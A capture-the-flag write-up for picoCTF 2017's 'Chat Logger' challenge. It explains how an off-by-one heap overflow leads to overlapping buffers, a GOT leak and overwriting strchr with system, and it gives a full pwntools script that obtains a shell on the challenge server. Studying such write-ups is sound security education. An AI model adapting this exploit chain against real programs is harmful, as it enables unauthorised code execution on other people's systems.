# Chat Logger
#### Writeup by hgarrereyn
* **Binary Exploitation**
* *200 points*
* Description: You've been given admin access to the chat logs for our organization to help clean up the language. See if you can get a shell on shell2017.picoctf.com:51628. chat-logger Source

# Solution

There was an off-by-one buffer overflow error in the `update_message` function that allowed you to overflow a null byte into the size descriptor for a heap object.

Then you could get the program to call realloc and overflow the buffer into what it thought was empty heap space but what was actually another heap object.

Once you got overlapping buffers, you could read the GOT table, calculate the address of `system` and overwrite an entry with that address.

I found it easiest to overwrite `strchr` which was called in `readline`:

```c
char *newline = strchr(buf, '\n');
```

That essentially becomes:

```c
char *newline = system(buf);
```

Then you simply enter the string `sh` and you have shell.

# Difficulties

It wasn't too hard to find the off by one error. Once I saw `strlen` and `malloc` calls with numbers being added, I had a gut feeling there could be an off-by-one error.

It took a bit of fiddling to get the program to malloc buffers that were right next to each other.

# Annotated Script

[**exploitChatLogger.py**]()

```python
# By Harrison Green <hgarrereyn>

from pwn import *

# Connect to the server
sock = remote('shell2017.picoctf.com', 51628)

# Helper function to consume input
def n():
	a = sock.recv()
	print(a)
	return a

# select the last message of room #2
sock.send('find 2 funny\n')
n()

# Create the A buffer
sock.send('add 1 ' + ('a' * 48) + '\n')
n()
sock.send('find 2 a\n')
n()

# Create the B buffer
sock.send('add 1 ' + ('b' * 200) + '\n')
n()
sock.send('find 2 b\n')
n()

# Create the C buffer
sock.send('add 1 ' + ('c' * 40) + '\n')
n()

# Overflow A
# Now, the B buffer has size zero and can be overwritten
# although we still retain a pointer to it
sock.send('find 2 a\n')
n()
sock.send('edit ' + ('a' * 54) + '\n')
n()

# We can now overlap the A and B buffers completely. Specifically,
# we will overwrite the text pointer with a GOT address in buffer B.
#
# If we had not done the last step, the realloc() call would return
# a different pointer because there wouldn't be enough space to expand
# buffer A.
#
# strchr@GOT: 0x601e60
sock.send('edit ' + ('a' * 78) + '\x5e\x1e\x60' + '\n')
n()

# The offset of libc functions - found by running this binary on
# the webshell.
#
# <strchr> - 256766 = <system>
offset = - 256766

# This will print out all the messages, including the pointer
# to <strchr> that we set earlier.
sock.send('chat 2\n')

# Some pythonic magic to parse the GOT address for <strchr>
chat = sock.recvuntil('ccc').split('\n')
l = chat[len(chat) - 3]
l2 = "".join([hex(ord(x))[2:].zfill(2) for x in l][-6:][::-1])

# Got the address
print('strchr: ' + l2)

# Calculate system address
strchr = int(l2,16)
sys = strchr + offset
sys_addr = hex(sys)[2:].decode('hex')

# Got system address
print('system: ' + hex(sys))

# We are editing the message with a text pointer that is now
# pointing into the GOT table at strchr
sock.send('edit ' + sys_addr[::-1] + '\n')

# Now when we send this, it will be called by system()
sock.send('sh\n')

# We've got shell
sock.interactive()
```
